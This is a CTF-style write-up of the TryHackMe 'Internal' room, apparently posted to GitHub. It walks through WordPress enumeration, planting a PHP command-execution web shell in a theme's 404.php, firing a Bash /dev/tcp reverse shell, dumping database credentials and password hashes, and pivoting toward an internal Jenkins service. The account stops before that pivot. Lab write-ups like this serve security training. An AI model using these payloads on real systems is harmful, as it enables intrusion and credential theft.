<img width="1885" height="417" alt="image" src="https://github.com/user-attachments/assets/5b0eb57a-5d0c-4295-b9d1-1569fe65c9d0" /># TryHackMe: Internal Write-up

<img width="1885" height="417" alt="image" src="https://github.com/user-attachments/assets/6e838b77-aec7-49aa-b6e7-43e90464faee" />

## Introduction

Internal is a Linux-based TryHackMe room that focuses on web enumeration, WordPress exploitation, credential discovery, pivoting into an internal service, and privilege escalation.

The room starts with a public-facing web application and slowly leads into internal-only services. The main lesson from this room is to keep enumerating after every new shell, because each stage gives a clue for the next one.

---

To make it more convenient, I added it the target ip to `/etc/hosts` and put the hostname as `internal.thm`

```bash
sudo nano /etc/hosts
```

```text
<TARGET_IP> internal.thm
```

## Reconnaissance

I started with an Nmap scan to identify open ports and running services on the target machine.

```bash
nmap -sC -sV -oN nmap.txt internal.thm
```
<img width="1339" height="437" alt="image" src="https://github.com/user-attachments/assets/10f0be86-80ed-4585-afa3-e2a61beab757" />

The open ports were:

```text
22/tcp  SSH
80/tcp  HTTP
```

I opened the site:

```text
http://internal.thm
```

The website was running WordPress.

---

## WordPress Enumeration

Since the target was a WordPress site, I started enumerating common WordPress paths and information.

Useful areas to check included:

```text
/wp-admin
/wp-login.php
/wp-content/
/wp-content/themes/
/wp-content/plugins/
```

I also checked the blog path:

```text
http://internal.thm/blog/
```

From the WordPress login page, I confirmed that WordPress authentication was available.

At this stage, the goal was to find valid WordPress credentials or another weakness that could give access to the admin dashboard.

After testing credentials and enumerating the site, I was able to log in to the WordPress admin panel.

---

## WordPress Admin Access

Once logged into WordPress, I checked the available admin features. One interesting feature was the theme editor.

The theme editor allowed editing PHP files inside the active WordPress theme.

The vulnerable page was:

```text
/wp-admin/theme-editor.php
```

The theme being used was:

```text
twentyseventeen
```

I edited the `404.php` template file and inserted a small PHP command execution payload.

```php
<?php system($_GET['cmd']); ?>
```

This allowed me to execute system commands through the browser by passing a `cmd` parameter.

The payload was triggered from:

```text
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=id
```

After confirming command execution, I prepared a reverse shell.

---

## Initial Foothold

On Kali, I started a Netcat listener:

```bash
rlwrap -cAr nc -lvnp 4444
```

Then I triggered a Bash reverse shell through the modified WordPress theme file.

```text
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'
```

The reverse shell connected back successfully.

I confirmed the current user:

```bash
whoami
```

The shell was running as:

```text
www-data
```

At this point, I had an initial foothold on the target through WordPress theme file modification.

---

## Local Enumeration as www-data

After getting a shell, I started local enumeration.

First, I checked the current directory and web root:

```bash
pwd
ls -la
ls -la /var/www/html
```

Since this was a WordPress site, I looked for the WordPress configuration file:

```bash
cat /var/www/html/blog/wp-config.php
```

The `wp-config.php` file contained database credentials.

I used these credentials to access the local MySQL database and inspect the WordPress database.

```bash
mysql -u <DB_USER> -p
```

Inside MySQL, I listed the databases:

```sql
show databases;
```

Then selected the WordPress database:

```sql
use wordpress;
```

I checked the tables:

```sql
show tables;
```

One important table was:

```text
wp_users
```

I dumped the WordPress users:

```sql
select user_login,user_pass from wp_users;
```

After further enumeration and credential testing, I found credentials that allowed access to the user account on the machine.

---

## User Shell

Using the discovered credentials, I switched to the user account.

```bash
su aubreanna
```

Or through SSH:

```bash
ssh aubreanna@internal.thm
```

After logging in as `aubreanna`, I checked the home directory:

```bash
ls -la /home/aubreanna
```

The user flag was located in:

```bash
/home/aubreanna/user.txt
```

I also found another important file:

```bash
cat /home/aubreanna/jenkins.txt
```

The file revealed that an internal Jenkins service was running on:

```text
172.17.0.2:8080
```

This was a major clue. Jenkins was not directly exposed externally, so I needed to pivot to access it.
